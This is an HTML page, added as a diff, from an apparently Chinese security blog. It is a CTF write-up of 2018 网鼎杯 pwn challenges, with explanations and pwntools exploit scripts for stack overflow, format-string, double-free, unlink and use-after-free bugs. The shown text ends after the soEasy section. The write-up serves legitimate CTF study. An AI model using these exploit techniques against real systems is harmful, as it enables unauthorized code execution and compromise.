@@ -1,0 +1,388 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>网鼎杯 2018 Pwn - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="网鼎杯 2018 Pwn"><meta property="og:description" content="准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/wdb2018-pwn/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-05-04T11:17:45+00:00"><meta property="article:modified_time" content="2020-05-04T11:17:45+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="网鼎杯 2018 Pwn"><meta name=twitter:description content="准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/wdb2018-pwn/><link rel=prev href=https://blog.sigmerc.top/pwn-template/><link rel=next href=https://blog.sigmerc.top/passwd/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"网鼎杯 2018 Pwn","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/wdb2018-pwn\/"},"genre":"posts","keywords":"栈漏洞, fsb, 堆漏洞","wordcount":2390,"url":"https:\/\/blog.sigmerc.top\/wdb2018-pwn\/","datePublished":"2020-05-04T11:17:45+00:00","dateModified":"2020-05-04T11:17:45+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">网鼎杯 2018 Pwn</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>二进制安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-05-04>2020-05-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2390 字&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;<span id=/wdb2018-pwn/ class=leancloud_visitors data-flag-title="网鼎杯 2018 Pwn">
+<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#guess>GUESS</a></li><li><a href=#blind>blind</a></li><li><a href=#babyheap>babyheap</a></li><li><a href=#easyfmt>easyfmt</a></li><li><a href=#fgo>fgo</a></li><li><a href=#soeasy>soEasy</a></li><li><a href=#pesp>pesp</a></li><li><a href=#semifinal_pwn1>semifinal_pwn1</a></li><li><a href=#semifinal_pwn2>semifinal_pwn2</a></li><li><a href=#semifinal_pwn3>semifinal_pwn3</a></li></ul></nav></div></div><div class=content id=content><p>准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。</p><h2 id=guess>GUESS</h2><p>题目有三次猜 flag 机会，每次都会 <code>fork</code> 出子进程，并且开启了 canary。尝试运行可以发现读取的 flag 放在了栈上，因此我们需要栈地址来泄露 flag，而泄露栈地址需要先泄露 libc。</p><p>首先我们可以覆盖 <code>argv[0]</code> 为 <code>puts@got</code>，借助 <code>__stack_chk_fail</code> 函数的报错来泄露 libc。输入任意字符串进入 <code>strncmp</code>，在此处下断点，通过 <code>p &__libc_argv[0]</code> 可得到 <code>argv[0]</code> 地址，然后查看栈得到我们输入的字符串所在地址，两个地址的距离就是我们需要栈溢出的长度，这个长度是 0x128。然后放上 <code>puts@got</code> 就能泄露 libc，接下来就能得到 <code>_environ</code> 地址。</p><p>计算 <code>_environ</code> 地址到 <code>flag</code> 地址的距离就能得到 flag 真实地址，这个距离是 0x168，我们可以在第三次地址泄露中读到 flag。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>ssp</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>sla</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x128</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;detected ***:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ssp</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>base</span><span class=p>,</span><span class=n>libc</span><span class=p>,</span><span class=n>system</span> <span class=o>=</span> <span class=n>leak_libc</span><span class=p>(</span><span class=s1>&#39;puts&#39;</span><span class=p>,</span><span class=n>puts</span><span class=p>,</span><span class=n>libc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>env</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_environ&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>ssp</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>env</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x168</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ssp</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=blind>blind</h2><p>本题存在 double free 但没有 show 功能，申请堆块时只能申请 0x68 大小的，这个大小我们喜闻乐见，因为申请到的实际堆块大小为 0x70，而我们一般伪造 chunk size 都是借助 0x7f 来构造。</p><p>那么我们可以借助 double free 申请堆块到全局数组的位置，伪造的堆块可以在 <code>0x602060-0x23</code> 处找到，然后就可以在全局数组上方再伪造一个 0x100 大小的 chunk，从而绕过 0x68 的限制申请到 small chunk。这里我们将 <code>ptr[0]</code> 和 <code>ptr[2]</code> 写成 <code>0x602060</code>，将 <code>ptr[4]</code> 写成 <code>0x602150</code>，我们稍后会看到原因。</p><p>需要注意的是 <code>free</code> 时会检查后两块的 chunk size 是否合法，因此我们同样需要伪造：下一个 chunk 的起始地址为 <code>0x602050+0x100 = 0x602150</code>，可以从这里开始伪造 2 个 0x21 的 chunk。这里就是通过 <code>ptr[4]</code> 来伪造的。</p><p>然后我们释放 0x100 的伪造 chunk，这样在释放时即进入 unsorted bin，覆盖 <code>ptr[0]</code> 和 <code>ptr[1]</code> 为 <code>main_arena+88</code>。释放需要用到一个指向 <code>0x602060</code> 的指针，也就是我们之前在 <code>ptr[0]</code> 写入的指针。随后进行 partial overwrite，覆盖掉 <code>ptr[0]</code> 也就是 <code>main_arena+88</code> 的最低 1 字节为 <code>\x00</code>，这时 <code>ptr[0]</code> 存放的就是 <code>__malloc_hook-0x10</code> 的地址，这一步是编辑 <code>ptr[2]</code> 处指针指向的内容实现的。</p><p>此时再编辑 <code>ptr[0]</code> 指向的内容即可写 <code>__malloc_hook</code> 为后门函数。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=mh>0x602060</span>
+</span></span><span class=line><span class=cl><span class=n>fake_next</span> <span class=o>=</span> <span class=mh>0x602150</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>fake</span><span class=o>-</span><span class=mh>0x23</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x101</span><span class=p>,</span><span class=n>fake</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake_next</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 0x100</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=c1># \x00, malloc_hook-0x10</span>
+</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=mh>0x4008e3</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>_add</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=babyheap>babyheap</h2><p>本题和上题有点类似，只能分配 0x20 的堆块，漏洞点相同，且多了 show 功能。</p><p>首先考虑泄露 libc，我们采用传统的 unsorted bin 泄露大法，这就需要我们伪造 small chunk。为了伪造这个 chunk，首先要泄露堆地址，那么连续释放 2 个 fast chunk，后一个的 fd 就会指向前一个 chunk 的地址，从而可以泄露堆地址。唯一需要注意的是 show 在输出时用的 <code>puts</code> 遇到 <code>\x00</code> 会截断，所以要注意释放顺序使得泄露出的地址中不存在 <code>\x00</code> 字节。</p><p>获得堆地址之后，在 chunk0 内伪造 chunk 头造成堆块重叠，然后申请两次就可以申请到一个 <code>heap+0x20</code> 处的 chunk，通过写这个 chunk 我们可以写 chunk1 的头部，使得其大小变成 0xa1。随后释放即可泄露 libc，但这里释放时会检查后两个 chunk 的 size，因此我们还需要绕过检查。</p><p>绕过的方法是，不断申请 chunk 直到 0xa1 这个 chunk 的末尾，此时申请到的是 chunk4。写入 <code>0,0x31</code> 伪造一个 chunk 头；再申请一个 chunk5，写入 <code>0x30,0x30</code> 伪造 chunk 头，使得 chunk4 看起来是空闲的。这两步先做好后再释放 chunk1 才能通过检查。</p><p>这里让 chunk4 空闲的目的就是为了触发 <code>unlink</code> 造成任意地址写，那么显然我们还需要再 chunk4 的内容里添加伪造的 <code>fd</code> 和 <code>bk</code>，即 <code>0x602080-0x18</code> 和 <code>0x602080-0x10</code>，这里 <code>0x602080</code> 是 <code>ptr[4]</code>。<code>unlink</code> 之后，我们成功令 <code>ptr[4]</code> 指向 <code>ptr[1]</code>。现在编辑 chunk4 即可修改 <code>ptr[1]</code> 为 <code>free_hook</code>，然后编辑 chunk1 即可覆盖 <code>free_hook</code> 为 <code>one_gadget</code>（<code>system</code> 同理）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=mh>0x602080</span><span class=o>-</span><span class=mh>0x18</span>
+</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=mh>0x602080</span><span class=o>-</span><span class=mh>0x10</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x31</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=mh>0x30</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x30</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=n>heap</span><span class=o>+</span><span class=mh>0x20</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x31</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=c1># 0</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0xa1</span><span class=p>))</span> <span class=c1># above 1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=easyfmt>easyfmt</h2><p>常规的 32 位格式化字符串题，自动化测得偏移为 6，然后泄露 libc，覆盖 <code>printf@got</code> 为 <code>system</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exec_fmt</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>info</span> <span class=o>=</span> <span class=n>r</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>info</span>
+</span></span><span class=line><span class=cl><span class=n>auto</span> <span class=o>=</span> <span class=n>FmtStr</span><span class=p>(</span><span class=n>exec_fmt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=s1>&#39;%6$s&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>printf</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;printf&#39;</span><span class=p>,</span><span class=n>printf</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>base</span><span class=p>,</span><span class=n>libc</span><span class=p>,</span><span class=n>system</span> <span class=o>=</span> <span class=n>leak_libc</span><span class=p>(</span><span class=s1>&#39;printf&#39;</span><span class=p>,</span><span class=n>printf</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>fmtstr_payload</span><span class=p>(</span><span class=n>auto</span><span class=o>.</span><span class=n>offset</span><span class=p>,</span> <span class=p>{</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]:</span><span class=n>system</span><span class=p>}))</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=fgo>fgo</h2><p>入门级堆题，直接 uaf 即可。解法可以参考 <code>hitcontraining_hacknote</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;secret&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=soeasy>soEasy</h2><p>存在栈溢出，给出了栈地址，checksec 发现 NX 关闭，因此直接写好 shellcode 然后返回到 shellcode 地址即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x4c</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
